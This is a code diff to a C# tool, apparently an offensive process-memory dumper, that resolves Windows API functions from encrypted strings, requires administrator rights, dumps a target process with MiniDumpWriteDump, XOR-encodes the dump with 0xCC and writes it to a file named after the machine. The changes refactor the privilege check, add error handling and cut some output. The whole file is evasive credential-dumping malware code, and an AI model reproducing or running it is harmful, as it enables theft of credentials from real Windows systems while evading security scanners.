@@ -94,15 +94,19 @@ namespace CustomD
         }
 
 
+        static void CheckPrivileges() {
+            if (WindowsIdentity.GetCurrent().Owner.IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid) == false)
+            {
+                Console.WriteLine("[-] Error: Execute with administrative privileges.");
+                Environment.Exit(0);
+            }
+        }
+
+
         public static void Main(string[] args)
         {
             // Check we are running an elevated process
-            if (WindowsIdentity.GetCurrent().Owner
-                  .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid) == false)
-            {
-                Console.WriteLine("[-] Error: Execute with administrative privileges.");
-                return;
-            }
+            CheckPrivileges();
 
             // Resolve functions from delegates
             IntPtr k32 = GetLibAddress(Kernel32_enc_str);
@@ -122,7 +126,6 @@ namespace CustomD
             String filename;
             if (args == null || args.Length == 0)
             {
-                // Source: https://docs.microsoft.com/en-us/dotnet/api/system.datetime.tostring?view=net-5.0
                 String now = DateTime.Now.ToString("dd-MM-yy-HHmm");
                 String extension = ".txt";
                 filename = Directory.GetCurrentDirectory() + "\\" + Environment.MachineName + "_" + now + extension;
@@ -138,9 +141,7 @@ namespace CustomD
             if (processHandle != INVALID_HANDLE_VALUE)
             {
                 Console.WriteLine("[+] Handle to process created correctly.");
-                Console.WriteLine("[+] Process handle: \t\t{0}", processHandle);
-                Console.WriteLine("[+] Process PID: \t\t{0}", processPID);
-
+                
                 // Dump the process
                 CallBack MyCallBack = new CallBack(CallBackFunction);
                 MINIDUMP_CALLBACK_INFORMATION mci;
@@ -150,37 +151,28 @@ namespace CustomD
                 Marshal.StructureToPtr(mci, mci_pointer, true);
                 bool isRead = auxMiniDumpWriteDump(processHandle, processPID, IntPtr.Zero, 2, IntPtr.Zero, IntPtr.Zero, mci_pointer);
                 Marshal.FreeHGlobal(mci_pointer);
+                if (!isRead)
+                {
+                    Console.WriteLine("[-] Error: Process not dumped.");
+                }
 
-                // Information about dump in memory 
+                /*
+                // Print information about dump in memory 
                 GCHandle pinnedArray = GCHandle.Alloc(dumpBuffer, GCHandleType.Pinned);
                 IntPtr dumpBuffer_pointer = pinnedArray.AddrOfPinnedObject();
                 Console.WriteLine("[+] Dump address: \t\t0x" + dumpBuffer_pointer.ToString("X"));
                 Console.WriteLine("[+] Dump size: \t\t\t" + bufferSize + " bytes");
                 pinnedArray.Free();
+                */
 
                 // Encode buffer
                 byte xor_byte = (byte)0xCC;
                 EncodeBuffer(dumpBuffer, bufferSize, xor_byte);
 
-                // Dump to file
-                string fname = filename;
-                const uint GENERIC_ALL = 0x10000000;
-                const uint FILE_SHARE_WRITE = 0x00000002;
-                const uint CREATE_ALWAYS = 2;
-                const uint FILE_ATTRIBUTE_NORMAL = 128;
-                IntPtr hFile = CreateFileA(fname, GENERIC_ALL, FILE_SHARE_WRITE, IntPtr.Zero, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
+                // Write to file
+                IntPtr hFile = CreateFileA(filename, GENERIC_ALL, FILE_SHARE_WRITE, IntPtr.Zero, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, IntPtr.Zero);
                 WriteFile(hFile, dumpBuffer, (uint)bufferSize, out _, IntPtr.Zero);
-
-                // FileStream output_file = new FileStream(filename, FileMode.Create);
-                // bool isRead2 = auxMiniDumpWriteDump(processHandle, processPID, output_file.SafeFileHandle.DangerousGetHandle(), 2, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
-                if (isRead)
-                {
-                    Console.WriteLine("[+] Successfully dumped. File " + filename);
-                }
-                else
-                {
-                    Console.WriteLine("[-] Error: Process not dumped.");
-                }
+                Console.WriteLine("[+] File " + filename);
             }
             else
             {
